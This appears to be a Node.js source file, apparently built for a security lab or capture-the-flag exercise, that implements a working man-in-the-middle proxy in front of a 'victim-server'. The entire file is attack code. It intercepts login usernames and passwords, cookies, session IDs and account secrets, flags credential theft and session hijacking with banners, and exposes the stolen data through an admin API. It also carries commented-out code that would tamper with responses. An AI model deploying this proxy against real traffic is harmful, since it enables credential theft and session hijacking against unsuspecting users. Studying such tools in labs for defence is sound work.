const express = require('express');
const httpProxy = require('http-proxy');
const bodyParser = require('body-parser');

const app = express();
const PORT = 8888;

// Configuration
const TARGET_HOST = process.env.TARGET_HOST || 'victim-server';
const TARGET_PORT = process.env.TARGET_PORT || 8080;
const TARGET_URL = `http://${TARGET_HOST}:${TARGET_PORT}`;
const DEBUG_MODE = process.env.DEBUG_MODE === 'true';

// Stockage des données interceptées
const interceptedData = {
  credentials: [],
  sessions: [],
  cookies: [],
  requests: [],
  responses: []
};

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Logger pour le mode debug
function log(message, data = null) {
  if (DEBUG_MODE) {
    console.log(`[MITM] ${message}`);
    if (data) {
      console.log(JSON.stringify(data, null, 2));
    }
  }
}

// Créer un proxy HTTP
const proxy = httpProxy.createProxyServer({
  target: TARGET_URL,
  changeOrigin: true,
  selfHandleResponse: true // Important pour intercepter les réponses
});

// Intercepter et logger toutes les requêtes
app.use((req, res, next) => {
  const timestamp = new Date().toISOString();
  
  log(`${req.method} ${req.url}`, {
    headers: req.headers,
    body: req.body
  });

  // Capturer les credentials lors du login
  if (req.url === '/api/login' && req.method === 'POST') {
    const { username, password } = req.body;
    
    interceptedData.credentials.push({
      timestamp,
      username,
      password,
      ip: req.ip,
      userAgent: req.headers['user-agent']
    });

    console.log(`
╔═══════════════════════════════════════════╗
║  🎯 CREDENTIALS INTERCEPTED!              ║
╠═══════════════════════════════════════════╣
║  Username: ${username.padEnd(30)}║
║  Password: ${password.padEnd(30)}║
║  Time: ${timestamp.substring(0, 19)}     ║
╚═══════════════════════════════════════════╝
    `);
  }

  // Capturer les cookies
  if (req.headers.cookie) {
    interceptedData.cookies.push({
      timestamp,
      url: req.url,
      cookies: req.headers.cookie
    });

    log('Cookies intercepted', { cookies: req.headers.cookie });
  }

  // Logger toutes les requêtes
  interceptedData.requests.push({
    timestamp,
    method: req.method,
    url: req.url,
    headers: req.headers,
    body: req.body
  });

  next();
});

// Proxy toutes les requêtes vers le serveur victime
app.use('/', (req, res) => {
  proxy.web(req, res, {}, (err) => {
    console.error('Proxy error:', err);
    res.status(500).json({
      success: false,
      message: 'Proxy error',
      error: err.message
    });
  });
});

// Intercepter les réponses
proxy.on('proxyRes', (proxyRes, req, res) => {
  let body = [];

  proxyRes.on('data', (chunk) => {
    body.push(chunk);
  });

  proxyRes.on('end', () => {
    const timestamp = new Date().toISOString();
    body = Buffer.concat(body).toString();
    
    let parsedBody;
    try {
      parsedBody = JSON.parse(body);
    } catch (e) {
      parsedBody = body;
    }

    log(`Response for ${req.method} ${req.url}`, parsedBody);

    // Capturer les session IDs
    if (req.url === '/api/login' && parsedBody.success) {
      const sessionId = parsedBody.sessionId;
      const user = parsedBody.user;

      interceptedData.sessions.push({
        timestamp,
        sessionId,
        user,
        cookies: proxyRes.headers['set-cookie']
      });

      console.log(`
╔═══════════════════════════════════════════╗
║  🔑 SESSION HIJACKED!                     ║
╠═══════════════════════════════════════════╣
║  User: ${(user.username || '').padEnd(34)}║
║  Role: ${(user.role || '').padEnd(34)}║
║  Session: ${(sessionId || '').substring(0, 28)}  ║
║  Time: ${timestamp.substring(0, 19)}     ║
╚═══════════════════════════════════════════╝
      `);
    }

    // Capturer les données sensibles du compte
    if (req.url === '/api/account' && parsedBody.success) {
      console.log(`
╔═══════════════════════════════════════════╗
║  💳 SENSITIVE DATA INTERCEPTED!           ║
╠═══════════════════════════════════════════╣
║  User: ${(parsedBody.user.username || '').padEnd(34)}║
║  Secret: ${(parsedBody.user.secret || '').substring(0, 32).padEnd(32)}║
║  Balance: $${String(parsedBody.user.balance || 0).padEnd(29)}║
╚═══════════════════════════════════════════╝
      `);
    }

    // Logger les réponses
    interceptedData.responses.push({
      timestamp,
      url: req.url,
      status: proxyRes.statusCode,
      headers: proxyRes.headers,
      body: parsedBody
    });

    // ATTAQUE: Modifier la réponse (optionnel)
    if (req.url === '/api/account' && parsedBody.success) {
      // Exemple: Voler le flag et le remplacer
      const stolenSecret = parsedBody.user.secret;
      console.log(`[MITM] 🏴 Stolen secret: ${stolenSecret}`);
      
      // On pourrait modifier ici:
      // parsedBody.user.secret = "Secret stolen by attacker!";
      // body = JSON.stringify(parsedBody);
    }

    // Envoyer la réponse au client
    res.writeHead(proxyRes.statusCode, proxyRes.headers);
    res.end(body);
  });
});

// Endpoint API pour voir les données interceptées
const adminApp = express();
adminApp.use(bodyParser.json());

adminApp.get('/intercepted/credentials', (req, res) => {
  res.json({
    success: true,
    count: interceptedData.credentials.length,
    data: interceptedData.credentials
  });
});

adminApp.get('/intercepted/sessions', (req, res) => {
  res.json({
    success: true,
    count: interceptedData.sessions.length,
    data: interceptedData.sessions
  });
});

adminApp.get('/intercepted/cookies', (req, res) => {
  res.json({
    success: true,
    count: interceptedData.cookies.length,
    data: interceptedData.cookies
  });
});

adminApp.get('/intercepted/all', (req, res) => {
  res.json({
    success: true,
    data: {
      credentials: interceptedData.credentials,
      sessions: interceptedData.sessions,
      cookies: interceptedData.cookies,
      totalRequests: interceptedData.requests.length,
      totalResponses: interceptedData.responses.length
    }
  });
});

adminApp.post('/intercepted/clear', (req, res) => {
  interceptedData.credentials = [];
  interceptedData.sessions = [];
  interceptedData.cookies = [];
  interceptedData.requests = [];
  interceptedData.responses = [];

  res.json({
    success: true,
    message: 'All intercepted data cleared'
  });
});

adminApp.get('/health', (req, res) => {
  res.json({
    status: 'healthy',
    service: 'mitm-proxy',
    target: TARGET_URL,
    timestamp: new Date().toISOString()
  });
});

// Démarrer le serveur admin sur un port différent
adminApp.listen(8889, () => {
  console.log(`📊 MITM Admin API running on port 8889`);
});

app.listen(PORT, () => {
  console.log(`
╔═══════════════════════════════════════════════════════╗
║  🕵️  MITM PROXY ACTIVE                                 ║
╠═══════════════════════════════════════════════════════╣
║  Proxy Port: ${PORT}                                      ║
║  Target: ${TARGET_URL}                      ║
║  Admin API: http://localhost:8889                     ║
║  Debug Mode: ${DEBUG_MODE ? 'ON ' : 'OFF'}                                  ║
╠═══════════════════════════════════════════════════════╣
║  ⚠️  This proxy intercepts and logs ALL traffic!       ║
║     - Credentials (username/password)                 ║
║     - Session IDs and cookies                         ║
║     - Sensitive data transmission                     ║
║     - Request/Response modification capability        ║
╚═══════════════════════════════════════════════════════╝
  `);
});
